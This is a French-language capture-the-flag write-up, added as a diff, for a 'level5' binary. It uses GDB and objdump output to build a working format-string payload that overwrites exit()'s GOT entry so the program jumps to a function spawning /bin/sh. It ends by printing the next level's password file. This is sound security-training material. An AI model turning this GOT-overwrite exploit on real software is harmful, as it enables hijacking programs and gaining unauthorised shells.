@@ -1,0 +1,219 @@
+Je commence par desassembler le binaire level5 dans ghidra
+
+Il y a une fonction n() et une fonction o() en plus de la fonction main()
+
+La fonction main() appelle la fonction n() puis retourne.
+La fonction n() fait un appel a fgets d'une taille de 512 dans un buffer de 520 puis appelle printf() avec le buffer rempli par fgets en argument, puis appelle la fonction exit().
+La fonction o() lance un shell avec system("/bin/sh")
+
+
+Je comprend immediatement que mon but est d'arriver a executer la fonction o() pour obtenir un shell qui me permettra d'obtenir le mot de passe de level6.
+
+
+Mon but est donc de reussir modifier l'adresse appellee lorsque la fonction exit() est appellee pour lui donner l'adresse de la fonction o() et ainsi executer la fonction pour obtenir le mot de passe de level6.
+
+La vulnerabilite a exploiter s'appelle GOT (Global Offset Table). Comment ca fonctionne ?:
+
+Quand un programme est execute la GOT est initialisee pour toutes les fonctions externes (dont celles de la libc), de cette maniere l'executable va mettre en cache les adresses de toutes les fonctions pour ne pas avoir a faire un appel a la libc a chaque appel de fonction.
+
+Le but dans mon cas est d;ecraser l'adresse de exit() avec celle de o().
+
+On va faire ca en 4 etapes:
+
+-Trouver l'adresse de o().
+-Trouver l'adresse de exit() dans la GOT.
+-Trouver le decalage de notre string sur la stack.
+-Ecrire la bonne chaine de caractere pour exploiter la faille.
+
+Trouver l'adresse de o():
+
+Je me sert de gdb pour ca:
+
+$>gdb level5
+(gdb)info functions
+All defined functions:
+
+Non-debugging symbols:
+0x08048334  _init
+0x08048380  printf
+0x08048380  printf@plt
+0x08048390  _exit
+0x08048390  _exit@plt
+0x080483a0  fgets
+0x080483a0  fgets@plt
+0x080483b0  system
+0x080483b0  system@plt
+0x080483c0  __gmon_start__
+0x080483c0  __gmon_start__@plt
+0x080483d0  exit
+0x080483d0  exit@plt
+0x080483e0  __libc_start_main
+0x080483e0  __libc_start_main@plt
+0x080483f0  _start
+0x08048420  __do_global_dtors_aux
+0x08048480  frame_dummy
+0x080484a4  o
+0x080484c2  n
+0x08048504  main
+0x08048520  __libc_csu_init
+0x08048590  __libc_csu_fini
+0x08048592  __i686.get_pc_thunk.bx
+0x080485a0  __do_global_ctors_aux
+0x080485cc  _fini
+
+=> l'adresse de o() est 0x080484a4
+
+
+Trouver l'adresse de exit() dans la GOT:
+
+J'utilise la commande objdump pour ca:
+
+$>objdump -R level5
+
+level5:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE
+08049814 R_386_GLOB_DAT    __gmon_start__
+08049848 R_386_COPY        stdin
+08049824 R_386_JUMP_SLOT   printf
+08049828 R_386_JUMP_SLOT   _exit
+0804982c R_386_JUMP_SLOT   fgets
+08049830 R_386_JUMP_SLOT   system
+08049834 R_386_JUMP_SLOT   __gmon_start__
+08049838 R_386_JUMP_SLOT   exit
+0804983c R_386_JUMP_SLOT   __libc_start_main
+
+=> l'adresse de exit() dans la GOT est 0x08049838
+
+
+
+==> Il faut que je change l'adresse pointee par exit(): 0x08049838 par celle pointee par o(): 0x080484a4.
+
+
+Trouver le decalage de ma string sur la stack:
+
+
+Pour cela je vais commencer par poser un breakpoint juste apres l'appel a printf dans gdb et je vais input au binaire une chaine de caractere qui va me permettre d'obtenir des informations sur la zone memoire que je peux manipuler.
+
+$>gdb level5
+(gdb)disas n
+Dump of assembler code for function n:
+   0x080484c2 <+0>:	push   %ebp
+   0x080484c3 <+1>:	mov    %esp,%ebp
+   0x080484c5 <+3>:	sub    $0x218,%esp
+   0x080484cb <+9>:	mov    0x8049848,%eax
+   0x080484d0 <+14>:	mov    %eax,0x8(%esp)
+   0x080484d4 <+18>:	movl   $0x200,0x4(%esp)
+   0x080484dc <+26>:	lea    -0x208(%ebp),%eax
+   0x080484e2 <+32>:	mov    %eax,(%esp)
+   0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>
+   0x080484ea <+40>:	lea    -0x208(%ebp),%eax
+   0x080484f0 <+46>:	mov    %eax,(%esp)
+   0x080484f3 <+49>:	call   0x8048380 <printf@plt>
+   0x080484f8 <+54>:	movl   $0x1,(%esp)
+   0x080484ff <+61>:	call   0x80483d0 <exit@plt>
+End of assembler dump.
+
+Je vais mettre mon breakpoint sur l'instruction qui suit l'appel a printf donc a l'adresse 0x0804f8
+
+Le programme attend un input, je vais lui donner "AAAA.%x.%x.%x.%x."
+
+(gdb)b *0x080484f8
+(gdb)r
+Starting program: /home/user/level5/level5
+AAAA.%x.%x.%x.%x.
+AAAA.200.b7fd1ac0.b7ff37d0.41414141
+
+Le programme print "AAAA.200.b7fd1ac0.b7ff37d0.41414141".
+
+Grace au level4 je sais que je viens de tomber directement sur l'adresse que je voulais je sais donc que j'ai besoin de 4 specificateurs pour ecrire sur cette adresse.
+
+A noter qu'on peut utiliser le specificateur '$' de printf pour s'en assurer egalement:
+
+$>./level5
+AAAA%4$p
+AAAA0x41414141
+
+=> Le decalage de ma string est donc de 4.
+
+
+Ecrire l'exploitation:
+
+Sur la wone memoire je dois ecrire l'adresse de o(): 0x080484a4 en octet de poids faible puis en octet de poids fort.
+
+Je dois ecrire ces octets a l'adresse de exit(): 0x08049838
+
+Essayons dans gdb en posant un breakpoint sur printf():
+
+$>gdb level5
+(gdb) disas n
+Dump of assembler code for function n:
+   0x080484c2 <+0>:	push   %ebp
+   0x080484c3 <+1>:	mov    %esp,%ebp
+   0x080484c5 <+3>:	sub    $0x218,%esp
+   0x080484cb <+9>:	mov    0x8049848,%eax
+   0x080484d0 <+14>:	mov    %eax,0x8(%esp)
+   0x080484d4 <+18>:	movl   $0x200,0x4(%esp)
+   0x080484dc <+26>:	lea    -0x208(%ebp),%eax
+   0x080484e2 <+32>:	mov    %eax,(%esp)
+   0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>
+   0x080484ea <+40>:	lea    -0x208(%ebp),%eax
+   0x080484f0 <+46>:	mov    %eax,(%esp)
+   0x080484f3 <+49>:	call   0x8048380 <printf@plt>
+   0x080484f8 <+54>:	movl   $0x1,(%esp)
+   0x080484ff <+61>:	call   0x80483d0 <exit@plt>
+End of assembler dump.
+(gdb) b *0x080484f3
+Breakpoint 1 at 0x80484f3
+(gdb) b *0x080484f8
+Breakpoint 2 at 0x80484f8
+(gdb) run < <(python -c 'print "\x38\x98\x04\x08%4$n"')
+Starting program: /home/user/level5/level5 < <(python -c 'print "\x38\x98\x04\x08%4$n"')
+
+Breakpoint 1, 0x080484f3 in n ()
+(gdb) x/x 0x08049838
+0x8049838 <_exit@got.plt>:	0x080483d6
+(gdb) n
+Single stepping until exit from function n,
+which has no line number information.
+(�
+
+Breakpoint 3, 0x080484f8 in n ()
+(gdb) x/x 0x08049838
+0x8049838 <_exit@got.plt>:	0x00000004
+
+
+La valeur obtenue est 4 parce que j'ai seulement ecrit sur les 4 premiers octets.
+
+
+Mon exploitation doit ressembler a ca:
+
+<adresse de exit() + le decalage de la string><adresse de exit()><val1>x%4$hn%<val2>x%5$hn
+
+Je dois traduire la valeur 1 et la valeur 2 depuis l'adresse de o(): 0x080484a4:
+
+-Val 1:
+	0804 (2052 en decimal) - les 8 octets pour l'adresse = 2044
+
+-Val 2
+	84a4 (33956) - les 2052 que j'ai deja ecrit = 31904
+
+
+=> L'exploitation finale est la suivante:
+
+\x3c\x98\x04\x08\x38\x98\x04\x08%2044x%4$hn%31904x%5$hn
+
+Pour l'utiliser il faut l'ecrire dans un fichier et utiliser cat pour l'input au programme en ouvrant un strem stdin pour maintenir le shell ouvert:
+
+La marche a suivre:
+
+$> chmod 777 .
+$> python -c 'print "\x3c\x98\x04\x08\x38\x98\x04\x08%2044x%4$hn%31904x%5$hn"' > out
+$> chmod 777 out
+$> cat out - | ./level5
+
+cat /home/user/level6/.pass
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+
+C'est reussi ! J'ai pu rediriger l'execution de exit() sur o().
